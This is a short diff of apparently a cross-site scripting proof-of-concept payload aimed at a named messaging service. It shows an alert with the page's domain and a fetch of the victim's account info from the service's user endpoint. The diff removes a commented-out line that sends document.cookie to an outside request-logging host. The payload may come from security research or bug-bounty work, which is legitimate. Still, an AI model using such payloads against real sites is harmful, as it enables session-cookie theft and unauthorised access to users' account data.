@@ -1,6 +1,5 @@
 alert("XSS on "+ document.domain)
 
-//fetch(`https://ywhftw.free.beeceptor.com/log?cookie=${document.cookie}`)
 
 fetch('https://my.zello.com/user/userinfo', {
   method: 'GET',
